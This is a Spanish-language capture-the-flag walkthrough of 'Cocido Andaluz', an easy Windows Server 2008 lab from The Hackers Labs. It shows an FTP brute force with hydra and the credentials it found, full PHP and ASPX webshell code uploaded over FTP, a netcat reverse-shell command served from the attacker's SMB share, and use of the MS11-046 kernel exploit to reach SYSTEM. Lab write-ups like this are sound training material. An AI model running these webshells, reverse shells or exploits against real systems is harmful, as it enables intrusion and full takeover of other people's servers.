- Tags: #IISServer #FTPWindows #ms11-046_exe #Windows
# Writeup Template: Maquina `[ Cocido Andaluz ]`
- **Enumeración de SMB**: Identificación de recursos compartidos en servicios SMB y posibles vulnerabilidades.
- **Enumeración de aplicación web**: Exploración de contenido web visible y oculto para detectar puntos de entrada.
- **Enumeración de servicios**: Identificación de los servicios que corren en los puertos abiertos, incluyendo versiones.
- **Escaneo de puertos TCP**: Detección de puertos abiertos en la máquina objetivo mediante escaneo TCP.

- Tags: #CocidoAndaluz
- Dificultad: `[ Facil ]`
- Plataforma: `[ The Hackers Labs ]`

---
## Configuracion del Entorno
**Nota:** Pagina oficcioal donde descargo los laboratorios: [The Hackers Labs](https://labs.thehackerslabs.com/)
- Descargamos el archivo **( .ova )**
- Descomprimimos el archivo **zip**
- Importamos el **ova** en **virtualBox**

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
192.168.100.43
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 192.168.100.43 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 192.168.100.43
# TTL: [ 128 ] -> [ Windows ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
tcpScan.py -t 192.168.100.43 -p 1-65000
[]()
# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.100.43 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p21,80,135,139,445,49152,49153,49154,49155,49156,49157,49158 192.168.100.43 -oN targeted
```

**Servicios identificados:**
```bash
21/tcp    open  ftp           Microsoft ftpd
80/tcp    open  http          Microsoft IIS httpd 7.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
```
---
## Enumeracion FTP
Lo primero que realizare es enumerar este servicio para detectra posibles vectores de ataque
```bash
nmap -sCV --script ftp-anon.nse -p21 192.168.100.43
```

No tenemos habilitado este usuario **anonymous**, y como no tenemos usuarios posibles aun no podemos realizar ataque de fuerza bruta
Mientras dejamos un ataque de fuerza bruta sobre este servicio, en lo que enumeramos el servicion web
```bash
hydra -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -f -t 4 ftp://192.168.100.43
```

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://192.168.100.43
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://192.168.100.43
http://192.168.100.43 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.0], IP[192.168.100.43], Microsoft-IIS[7.0], Title[Apache2 Debian Default Page: It works], X-Powered-By[ASP.NET]
```

#### **Análisis del Servidor IIS 7.0 (Internet Information Services 7.0)**
**IIS 7.0** es un servidor web desarrollado por Microsoft para sistemas Windows. Es común encontrarlo en entornos corporativos y máquinas Windows antiguas (lanzado en **2008**), suele ser objetivo de explotación por vulnerabilidades conocidas.
### Descubrimiento de Archivos y Rutas
```bash
dirsearch -u http://192.168.100.43 -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -t 50 -e php,php.back,backup,html,js,java,py,text,sh
```

- **Hallazgos**:
```bash
http://192.168.100.43/aspnet_client/
```

Al ingresar vemos lo siguiente:
```bash
## 403 - Prohibido: acceso denegado.
### No tiene permiso para ver este directorio o esta página con las credenciales que ha proporcionando.
```

Realizando fuzzing sobre la nueva ruta encontrada no obtuvimos nada
```bash
gobuster dir -u http://192.168.100.43/aspnet_client/ -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -t 50 -x php,php.back,backup,txt,sh,html,js,java,py
```

### Enumeracion SMB
Procedemos a enumerara este servicio con la siguiente herramienta:
```bash
enum4linux -a 192.168.100.43
```

Al enumerar no obtuvimos gran cosa, Ahora intentando enumerar recursos sin credenciales
```bash
smbclient -L //192.168.100.43/ -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.100.43 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Tambien probamos con permisos con usuario vacio
```bash
smbmap -H 192.168.100.43 -u '' -p ''

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
[!] Access denied on 192.168.100.43, no fun for you...                                                                   
[*] Closed 1 connections 
```
---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Despues de termianr el ataque de fuerza bruta con hydra sobre ftp tenemos lo siguiente:
```bash
[STATUS] 69.67 tries/min, 209 tries in 00:03h, 14344190 to do in 3431:38h, 4 active
[21][ftp] host: 192.168.100.43   login: info   password: PolniyPizdec0211
```

Ahora nos conectamos por **ftp** con estas credenciales
```bash
ftp 192.168.100.43
```

Desactivamos el modo **passive** para poder acceder a nuestro **webshell**
```bash
ftp> passive
Passive mode: off; fallback to active mode: off.
```

Proporcionamos estas credenciales
```bash
220 Microsoft FTP Service
Name (192.168.100.43:kali): info
331 Password required for info.
Password: PolniyPizdec0211
```

Listamos los recurso
```bash
ftp> dir
227 Entering Passive Mode (192,168,100,43,192,7).
125 Data connection already open; Transfer starting.
dr--r--r--   1 owner    group               0 Jun 14  2024 aspnet_client
-rwxrwxrwx   1 owner    group           11069 Jun 15  2024 index.html
-rwxrwxrwx   1 owner    group          184946 Jun 14  2024 welcome.png
```

Si ingresamos a la siguiente ruta en **ftp**
```bash
ftp> pwd
Remote directory: /aspnet_client
```

El mensaje **`227 Entering Passive Mode (192,168,100,43,192,18)`** es una respuesta del servidor FTP (en este caso, Microsoft FTPd) que indica que está entrando en **modo pasivo (PASV)** para la transferencia de datos.
- **Shell upload**: Intentaremos subir archivos, probaremos  una webshell ( `.php` o `.aspx`).

Primero probaremos con un **webshell** con **php**
```php
<?php
  system($_GET["cmd"]);
?>
```

Logramos subir el archivo pero no ha funcionado
```bash
ftp> put webshell.php
```

Usamos este **webshell**  **aspx**
```bash
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    string cmd = Request["cmd"];
    if (!string.IsNullOrEmpty(cmd))
    {
        Process proc = new Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = "/c " + cmd;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
        Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
        proc.WaitForExit();
    }
%>
```

Lo subimos al servidor **ftp**
```bash
ftp> put webshell.aspx
local: webshell.aspx remote: webshell.aspx
```
### Ejecucion del Ataque
Ahora ejecutamos el comando desde la terminar:
```bash
# Comandos para explotación
curl -s -X GET http://192.168.100.43/webshell.aspx?cmd=whoami

<pre>nt authority\servicio de red
</pre>
```

Una ves ejecutado comandos tenemos que ver como ganar acceso al objetivo asi que usaremos, el siguiente archivo
El archivo **`/usr/share/windows-resources/binaries/nc.exe`** es una copia del famoso programa **Netcat (nc.exe)** compilado para Windows, que suele estar incluido en distribuciones de pentesting como **Kali Linux** o **Parrot OS**. Su propósito principal es facilitar la conexión entre sistemas para transferencia de datos, escaneo de puertos, shells inversas (_reverse shells_) y otras tareas de red.
Nos copiamos este archivo a nuestro directorio de trabajo para subrlo atraves de **ftp**
```bash
cp /usr/share/windows-resources/binaries/nc.exe .
```
### Intrusion
Modo escucha
```bash
nc -nlvp 443
```

En esta ruta tenemos disponible **nc.exe**
```bash
impacket-smbserver share ~/labs/content
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.100.43,49176)
[*] AUTHENTICATE_MESSAGE (\,WIN-JG67MIHZH2X)
```

Ahora lo que tenemos que hacer es transferir, el archivo **nc.exe** al sistema objetivo
Ya sea desde curl o desde la web atraves de la url  ya con el servidor listo ejeuctamos la conexiion a la maquina victima
```bash
# Reverse shell o acceso inicial
192.168.100.43/webshell.aspx?cmd=\\192.168.100.24\share\nc.exe -e cmd.exe 192.168.100.24 4444
```

Recibimos la solicitud
```bash
[*] User WIN-JG67MIHZH2X\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:SHARE)
[*] Closing down connection (192.168.100.43,49176)
[*] Remaining connections []
```

Ahora si revisamos nuestro puerto, que abrimos con **nc** ya tenemso la conexion
```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.100.24] from (UNKNOWN) [192.168.100.43] 49182
Microsoft Windows [Versi�n 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  Reservados todos los derechos.

c:\windows\system32\inetsrv>
```

---

## Escalada de Privilegios.

###### Usuario `[ nt authority\servicio de red ]`:
Flag de usuario
```bash
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 1CEF-5C5A

 Directorio de c:\Users\info

14/06/2024  18:17    <DIR>          .
14/06/2024  18:17    <DIR>          ..
14/06/2024  18:15                26 user.txt
```

Para ver el contenido de la flag desde la **cmd**
```bash
c:\Users\info>type user.txt
```

Ahora usaremos el exploit para detectar vulnerabilidades sobre este input:
```bash
# systeminfo.txt

Nombre de host:                            WIN-JG67MIHZH2X
Nombre del sistema operativo:              Microsoft� Windows Server� 2008 Datacenter 
Versi�n del sistema operativo:             6.0.6001 Service Pack 1 Compilaci�n 6001
Fabricante del sistema operativo:          Microsoft Corporation
Configuraci�n del sistema operativo:       Servidor independiente
Tipo de compilaci�n del sistema operativo: Multiprocessor Free
Propiedad de:                              Usuario de Windows
Organizaci�n registrada:                   
Id. del producto:                          92577-082-2500446-76907
Fecha de instalaci�n original:             14/06/2024, 12:21:47
Tiempo de arranque del sistema:            17/08/2025, 19:59:31
Fabricante del sistema:                    innotek GmbH
Modelo el sistema:                         VirtualBox
Tipo de sistema:                           X86-based PC
Procesador(es):                            1 Procesadores instalados.
                                           [01]: x86 Family 23 Model 104 Stepping 1 AuthenticAMD ~1796 Mhz
Versi�n del BIOS:                          innotek GmbH VirtualBox, 01/12/2006
Directorio de Windows:                     C:\Windows
Directorio de sistema:                     C:\Windows\system32
Dispositivo de arranque:                   \Device\HarddiskVolume1
Configuraci�n regional del sistema:        es;Espa�ol (internacional)
Idioma de entrada:                         es;Espa�ol (tradicional)
Zona horaria:                              (GMT+01:00) Bruselas, Copenhague, Madrid, Par�s
Cantidad total de memoria f�sica:          2.023 MB
Memoria f�sica disponible:                 1.681 MB
Archivo de paginaci�n: tama�o m�ximo:      4.285 MB
Archivo de paginaci�n: disponible:         4.043 MB
Archivo de paginaci�n: en uso:             242 MB
Ubicaci�n(es) de archivo de paginaci�n:    C:\pagefile.sys
Dominio:                                   WORKGROUP
Servidor de inicio de sesi�n:              N/D
Revisi�n(es):                              N/D
Tarjeta(s) de red:                         1 Tarjetas de interfaz de red instaladas.
                                           [01]: Adaptador de escritorio Intel(R) PRO/1000 MT
                                                 Nombre de conexi�n: Conexi�n de �rea local
                                                 DHCP habilitado:    S�
                                                 Servidor DHCP:      192.168.100.1
                                                 Direcciones IP
                                                 [01]: 192.168.100.43
                                                 [02]: fe80::d890:f2a2:c676:293c
                                                 [03]: 2806:2f0:9781:f760:d890:f2a2:c676:293c
                                                 [04]: 2806:2f0:9781:f760::3
```

Ahora clonamos el siguiente exploit ya compilado para elevar privilegios [ms11](https://github.com/abatchy17/WindowsExploits/blob/master/MS11-046/MS11-046.exe)
```bash
wget https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046/ms11-046.exe
--2025-08-17 21:19:06--  https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046/ms11-046.ex
```

Una ves listo en nuestr maquina: en el mismo servidor que habiamos compartido, movemos el **ms11-046.exe** para que este disponilbe
Ahora nos movemos a la ruta **temp** que tiene capacidad de escritura
```bash
c:\Users\info>cd C:\Windows\Temp\
```

Ahora desde aqui realizamos la peticion para traernos este exploit a la maquina victima, Recordando que ya habiamos montando antes el servidor de recurso compartidos, Por eso ya no tuvimos que montarlo y nos facilita transferir archivos
```bash
C:\Windows\Temp>copy \\192.168.100.24\share\ms11-046.exe .
copy \\192.168.100.24\share\ms11-046.exe .
        1 archivos copiados.
```

Ahora explitamos el vinario
```bash
# Comando para escalar al usuario: ( root )
C:\Windows\Temp>ms11-046.exe
ms11-046.exe
```

---
## Evidencia de Compromiso
Flag de **root**
```bash
14/06/2024  18:17    <DIR>          .
14/06/2024  18:17    <DIR>          ..
14/06/2024  18:16                29 root.txt
               1 archivos             29 bytes
               2 dirs   9.820.504.064 bytes libres
```

```bash
# Captura de pantalla o output final
c:\Users\Administrador\Desktop>echo [+] Haced %username% && whoami
echo [+] Haced %username% && whoami
[+] Haced WIN-JG67MIHZH2X$ 
nt authority\system
```